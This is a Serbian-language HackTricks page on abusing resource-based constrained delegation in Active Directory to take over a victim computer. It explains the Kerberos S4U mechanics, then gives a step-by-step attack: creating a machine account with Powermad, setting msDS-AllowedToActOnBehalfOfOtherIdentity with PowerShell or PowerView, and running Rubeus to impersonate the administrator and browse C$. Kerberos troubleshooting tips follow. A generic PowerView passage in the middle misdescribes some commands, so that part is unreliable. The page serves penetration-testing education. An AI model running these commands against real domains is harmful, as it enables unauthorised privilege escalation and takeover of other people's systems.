# Resource-based Constrained Delegation

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnove resursno ograničenog preusmeravanja

Ovo je slično osnovnom [Ograničenom preusmeravanju](constrained-delegation.md) ali **umesto** davanja dozvola **objektu** da **impersonira bilo kog korisnika protiv servisa**. Resursno ograničeno preusmeravanje **postavlja** u **objektu ko može impersonirati bilo kog korisnika protiv njega**.

U ovom slučaju, ograničeni objekat će imati atribut nazvan _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može impersonirati bilo kog drugog korisnika protiv njega.

Još jedna važna razlika između ovog ograničenog preusmeravanja i drugih preusmeravanja je da bilo koji korisnik sa **dozvolama za pisanje nad računom mašine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može postaviti _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (u drugim oblicima preusmeravanja bili su vam potrebni privilegije domenskog administratora).

### Novi koncepti

U ograničenom preusmeravanju je rečeno da je potrebna oznaka **`TrustedToAuthForDelegation`** unutar vrednosti _userAccountControl_ korisnika da bi se izvršio **S4U2Self**. Ali to nije potpuno tačno.\
Realnost je da čak i bez te vrednosti, možete izvršiti **S4U2Self** protiv bilo kog korisnika ako ste **servis** (imate SPN), ali ako **imate `TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable**, a ako **nemate** tu oznaku vraćeni TGS **neće** biti **Forwardable**.

Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NE Forwardable**, pokušaj zloupotrebe **osnovnog ograničenog preusmeravanja** **neće uspeti**. Ali ako pokušavate da iskoristite **resursno ograničeno preusmeravanje, uspeće** (ovo nije ranjivost, već funkcionalnost, izgleda).

### Struktura napada

> Ako imate **ekvivalentne privilegije za pisanje** nad **računom računara**, možete dobiti **privilegovan pristup** toj mašini.

Pretpostavimo da napadač već ima **ekvivalentne privilegije za pisanje nad računarom žrtve**.

1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** ("Servis A"). Imajte na umu da **bilo koji** _Admin korisnik_ bez bilo kakvih drugih posebnih privilegija može **kreirati** do 10 **objekata računara (**_**MachineAccountQuota**_**)** i postaviti im SPN. Dakle, napadač može jednostavno kreirati objekat računara i postaviti SPN.
2. Napadač **zloupotrebljava svoje privilegije ZA PISANJE** nad računarom žrtve (ServisB) da konfiguriše **resursno ograničeno preusmeravanje kako bi dozvolio ServisuA da impersonira bilo kog korisnika** protiv tog računara žrtve (ServisB).
3. Napadač koristi Rubeus da izvrši **potpuni S4U napad** (S4U2Self i S4U2Proxy) od Servisa A do Servisa B za korisnika **sa privilegovanim pristupom Servisu B**.
4. S4U2Self (iz kompromitovanog/kreiranog naloga sa SPN-om): Zahtevaj **TGS Administratora meni** (Nije Forwardable).
5. S4U2Proxy: Koristi **TGS koji nije Forwardable** iz prethodnog koraka da zahteva **TGS** od **Administratora** do **računara žrtve**.
6. Čak i ako koristite TGS koji nije Forwardable, pošto iskorišćavate resursno ograničeno preusmeravanje, uspeće.
7. Napadač može **proslediti kartu** i **impersonirati** korisnika da bi dobio **pristup žrtvenom ServisuB**.

Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:

```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena koristeći [powermad](https://github.com/Kevin-Robertson/Powermad)**:**

```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurisanje ograničene delegacije zasnovane na resursima

**Korišćenje activedirectory PowerShell modula**

```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Korišćenje powerview-a**

Powerview je moćan alat za manipulaciju i istraživanje Active Directory okruženja. Može se koristiti za izvršavanje različitih zadataka, uključujući i manipulaciju ograničenjima delegacije resursa.

Da biste koristili powerview, prvo ga morate učitati u PowerShell sesiju. To možete učiniti pomoću sledeće komande:

```powershell
. .\PowerView.ps1
```

Nakon što je powerview učitan, možete koristiti različite funkcije za manipulaciju ograničenjima delegacije resursa. Na primer, možete koristiti funkciju `Get-DomainUser` da biste dobili informacije o korisnicima u domenu:

```powershell
Get-DomainUser
```

Ova funkcija će vam prikazati listu korisnika u domenu, zajedno sa njihovim atributima kao što su ime, korisničko ime, SID itd.

Da biste pronašli korisnike koji imaju omogućenu delegaciju resursa, možete koristiti funkciju `Get-DomainUser -TrustedToAuth`:

```powershell
Get-DomainUser -TrustedToAuth
```

Ova funkcija će vam prikazati listu korisnika koji su omogućili delegaciju resursa, zajedno sa informacijama o tome kojim računima su poverili autentifikaciju.

Kada pronađete korisnika sa omogućenom delegacijom resursa, možete koristiti funkciju `Get-DomainObjectAcl` da biste dobili informacije o dozvolama za određeni objekat u domenu:

```powershell
Get-DomainObjectAcl -Identity "CN=Computer1,OU=Computers,DC=example,DC=com"
```

Ova funkcija će vam prikazati listu dozvola za određeni objekat, uključujući i informacije o tome ko ima pristup objektu.

Powerview takođe pruža funkcije za manipulaciju ograničenjima delegacije resursa, kao što su `Add-DomainObjectAcl` i `Set-DomainObjectAcl`. Ove funkcije vam omogućavaju da dodate ili promenite dozvole za određeni objekat u domenu.

Korišćenje powerview-a može biti veoma korisno za istraživanje i manipulaciju ograničenjima delegacije resursa u Active Directory okruženju.

```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Izvođenje potpunog S4U napada

Prvo, kreirali smo novi objekat računara sa lozinkom `123456`, pa nam je potreban heš te lozinke:

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Ovo će ispisati RC4 i AES heševe za taj nalog.\
Sada se može izvršiti napad:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Možete generisati više karata tako što ćete samo jednom koristiti parametar `/altservice` u Rubeus-u:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

{% hint style="danger" %}
Napomena da korisnici imaju atribut koji se zove "**Ne može biti delegiran**". Ako korisnik ima ovaj atribut postavljen na True, nećete moći da se predstavljate kao taj korisnik. Ova osobina se može videti u Bloodhound-u.
{% endhint %}

### Pristupanje

Poslednja komanda će izvršiti **potpuni S4U napad i ubaciti TGS** od Administratora na ciljni računar u **memoriju**.\
U ovom primeru je zatražen TGS za uslugu **CIFS** od Administratora, tako da ćete moći da pristupite **C$**.

```bash
ls \\victim.domain.local\C$
```

### Zloupotreba različitih uslužnih karata

Saznajte o [**dostupnim uslužnim kartama ovde**](silver-ticket.md#dostupne-usluge).

## Greške u Kerberosu

* **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je Kerberos konfigurisan da ne koristi DES ili RC4, a vi dostavljate samo RC4 heš. Rubeusu dostavite barem AES256 heš (ili samo dostavite RC4, AES128 i AES256 hešove). Primer: `[Rubeus.Program]::MainString("s4u /user:LAZNOIMEKOMPJUTERA /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Ovo znači da je vreme trenutnog računara različito od vremena DC-a i Kerberos ne radi pravilno.
* **`preauth_failed`**: Ovo znači da dati korisničko ime + heševi ne funkcionišu za prijavljivanje. Možda ste zaboravili da stavite "$" unutar korisničkog imena prilikom generisanja heševa (`.\Rubeus.exe hash /password:123456 /user:LAZNOIMEKOMPJUTERA$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Ovo može značiti:
* Korisnik kog pokušavate da oponašate ne može pristupiti željenoj usluzi (jer je ne možete oponašati ili nema dovoljno privilegija)
* Tražena usluga ne postoji (ako tražite kartu za winrm, ali winrm nije pokrenut)
* Kreirani lažni računar je izgubio privilegije nad ranjivim serverom i morate ih vratiti.

## Reference

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
